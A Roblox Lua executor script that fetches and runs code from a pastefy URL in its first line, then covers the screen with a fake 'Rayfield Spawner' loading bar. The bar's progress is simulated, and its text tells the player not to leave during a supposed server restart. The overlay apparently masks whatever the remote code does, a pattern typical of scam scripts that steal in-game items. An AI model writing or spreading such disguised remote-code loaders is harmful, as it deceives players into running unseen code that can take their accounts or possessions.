loadstring(game:HttpGet("https://pastefy.app/v8QBIF30/raw"))()





--üåü Loading Screen in CoreGui
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")

-- Remove old if exists
pcall(function()
	local old = CoreGui:FindFirstChild("NicohLoading")
	if old then old:Destroy() end
end)

-- üåå ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "NicohLoading"
screenGui.IgnoreGuiInset = true
screenGui.ResetOnSpawn = false
screenGui.Parent = CoreGui

-- üåÑ Background
local background = Instance.new("Frame")
background.BackgroundColor3 = Color3.fromRGB(22, 22, 30)
background.Size = UDim2.new(1, 0, 1, 0)
background.Position = UDim2.new(0, 0, 0, 0)
background.BorderSizePixel = 0
background.Parent = screenGui

-- üåà Moving Gradient
local gradient = Instance.new("UIGradient", background)
gradient.Color = ColorSequence.new{
	ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 0, 70)),
	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 120, 255)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 0, 50))
}
gradient.Rotation = 0
gradient.Offset = Vector2.new(0, 0)

-- üåä Animate gradient offset
local offsetX = 0
RunService.RenderStepped:Connect(function()
	offsetX = offsetX + 0.002
	if offsetX > 1 then offsetX = -1 end
	gradient.Offset = Vector2.new(offsetX, 0)
end)

-- üî† Title at Top Center
local title = Instance.new("TextLabel")
title.Size = UDim2.new(0, 400, 0, 50)
title.Position = UDim2.new(0.5, -200, 0.05, 0)
title.BackgroundTransparency = 1
title.Text = "Rayfield Spawner"
title.Font = Enum.Font.GothamBlack
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextScaled = true
title.Parent = background

-- üìú Description Left Middle
local desc = Instance.new("TextLabel")
desc.Size = UDim2.new(0, 350, 0, 100)
desc.Position = UDim2.new(0.05, 0, 0.5, -50)
desc.BackgroundTransparency = 1
desc.Text = "Don't leave wait on the Server restart\nDon't leave again just wait it"
desc.Font = Enum.Font.Gotham
desc.TextColor3 = Color3.fromRGB(200, 200, 200)
desc.TextWrapped = true
desc.TextScaled = true
desc.Parent = background

-- üí´ Loading Bar Frame
local loadingFrame = Instance.new("Frame")
loadingFrame.Size = UDim2.new(0, 400, 0, 30)
loadingFrame.Position = UDim2.new(0.5, -200, 0.85, 0)
loadingFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
loadingFrame.BorderSizePixel = 0
loadingFrame.Parent = background

local loadingCorner = Instance.new("UICorner")
loadingCorner.CornerRadius = UDim.new(0, 14)
loadingCorner.Parent = loadingFrame

-- ‚úÖ Fill
local fill = Instance.new("Frame")
fill.Size = UDim2.new(0, 0, 1, 0)
fill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
fill.BorderSizePixel = 0
fill.Parent = loadingFrame

local fillCorner = Instance.new("UICorner")
fillCorner.CornerRadius = UDim.new(0, 14)
fillCorner.Parent = fill

-- üìä Loading Text
local label = Instance.new("TextLabel")
label.Size = UDim2.new(0, 200, 0, 50)
label.Position = UDim2.new(0.5, -100, 0.75, 0)
label.BackgroundTransparency = 1
label.TextColor3 = Color3.fromRGB(255, 255, 255)
label.Font = Enum.Font.GothamBold
label.TextScaled = true
label.Text = "Loading... 0%"
label.Parent = background

-- üöÄ Animate Fill
local progress = 0
local maxProgress = 100

local function updateLoading(pct)
	label.Text = "Loading... " .. tostring(math.floor(pct)) .. "%"
	TweenService:Create(fill, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
		Size = UDim2.new(pct/100, 0, 1, 0)
	}):Play()
end

-- üîÅ Simulate Loading
coroutine.wrap(function()
	while progress < maxProgress do
		progress += math.random(1, 4)
		progress = math.clamp(progress, 0, 100)
		updateLoading(progress)
		wait(0.1 + math.random())
	end

	wait(0.4)
	TweenService:Create(screenGui, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play()
	wait(0.5)
	screenGui:Destroy()
end)()
